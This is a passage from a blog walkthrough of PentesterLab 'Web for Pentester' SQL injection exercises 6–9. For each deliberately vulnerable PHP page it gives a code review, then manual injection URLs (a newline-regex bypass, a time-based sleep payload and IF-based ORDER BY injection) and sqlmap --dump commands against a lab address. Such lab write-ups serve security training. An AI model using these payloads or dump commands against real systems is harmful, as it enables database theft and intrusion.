This regular expression just ensure the</code>id<code>ends with a digit, it doesn't check the beginning of the</code>id`. So the poc in example 5 is also vaild in this situation.</p>

<p>Manual exploit:</p>

<p><code>http://192.168.79.162/sqli/example6.php?id=2%20or%201=1#</code></p>

<h3>Example 7</h3>

<p>code review:</p>

<pre><code class="php example7.php">&lt;?php

  require_once('../header.php');
  require_once('db.php');
    if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
        die("ERROR INTEGER REQUIRED");  
    }
    $sql = "SELECT * FROM users where id=";
    $sql .= $_GET["id"];

    $result = mysql_query($sql);

    if ($result) {
        ?&gt;
        &lt;table class='table table-striped'&gt;
      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
        &lt;?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "&lt;tr&gt;";
                echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
            echo "&lt;/tr&gt;";
        }   
        echo "&lt;/table&gt;";
    }
    require '../footer.php';
?&gt;
</code></pre>

<p>The regular expression checked both beginning and end of the input correctly. However, it contains the modifier <code>PCRE_MULTILINE (/m)</code>. It only vaildate that one of the lines is only containing an integer, and the following values will therefore be valid. So use encoded new line symbol will bypass this.</p>

<p>Manual exploit:</p>

<p><code>http://192.168.79.162/sqli/example7.php?id=2%0A or 1=1</code></p>

<p>sqlmap exploit:</p>

<p><code>sqlmap -u "http://192.168.79.162/sqli/example7.php?id=2%0a*" --dump</code></p>

<h3>Example 8</h3>

<p>code review:</p>

<pre><code class="php example8.php">&lt;?php

  require_once('../header.php');
  require_once('db.php');
    $sql = "SELECT * FROM users ORDER BY `";
    $sql .= mysql_real_escape_string($_GET["order"])."`";
    $result = mysql_query($sql);

    if ($result) {``
        ?&gt;
        &lt;table  class='table table-striped'&gt;
        &lt;tr&gt;
            &lt;th&gt;&lt;a href="example8.php?order=id"&gt;id&lt;/th&gt;
            &lt;th&gt;&lt;a href="example8.php?order=name"&gt;name&lt;/th&gt;
            &lt;th&gt;&lt;a href="example8.php?order=age"&gt;age&lt;/th&gt;
        &lt;/tr&gt;
        &lt;?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "&lt;tr&gt;";
                echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
            echo "&lt;/tr&gt;";
        }   
        echo "&lt;/table&gt;";
    }
    require '../footer.php';
?&gt;
</code></pre>

<p>After reviewing the source code, I decided to inject payload into &ldquo;ORDER BY&rdquo; statement, using Time-based blind injection.</p>

<p>Manual exploit (encode order=id`,(select sleep(10) from dual where database() like database())#):</p>

<p><code>http://192.168.79.162/sqli/example8.php?order=id</code>,(select sleep(10) from dual where database() like database())#`</p>

<p><img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql8_manual.JPG" title="[title manually exploit [alt text]]" ></p>

<p>sqlmap exploit:</p>

<p><code>sqlmap -u "http://192.168.79.162/sqli/example8.php?order=id%60" --dump</code></p>

<p><img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql8_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>

<h3>Example 9</h3>

<p>code review:</p>

<pre><code class="php example9.php">&lt;?php
  require_once('../header.php');
  require_once('db.php');
    $sql = "SELECT * FROM users ORDER BY ";
  $sql .= mysql_real_escape_string($_GET["order"]);
    $result = mysql_query($sql);
    if ($result) {
        ?&gt;
        &lt;table class='table table-striped'&gt;
        &lt;tr&gt;
            &lt;th&gt;&lt;a href="example9.php?order=id"&gt;id&lt;/th&gt;
            &lt;th&gt;&lt;a href="example9.php?order=name"&gt;name&lt;/th&gt;
            &lt;th&gt;&lt;a href="example9.php?order=age"&gt;age&lt;/th&gt;
        &lt;/tr&gt;
        &lt;?php
        while ($row = mysql_fetch_assoc($result)) {
            echo "&lt;tr&gt;";
                echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
                echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
            echo "&lt;/tr&gt;";
        }   
        echo "&lt;/table&gt;";
    }
  require '../footer.php';
?&gt;
</code></pre>

<p>Since there is no back-tick. I will use IF function to inject the payload of &ldquo;order by&rdquo;</p>

<p>manually exploit:</p>

<p><code>http://192.168.79.162/sqli/example9.php?order=if(1&gt;2, name, age)</code></p>

<p>sqlmap exploit:</p>

<p><code>sqlmap -u "http://192.168.79.162/sqli/example9.php?order=id" --dump</code></p>
]]></content>
  </entry>
  
</feed>
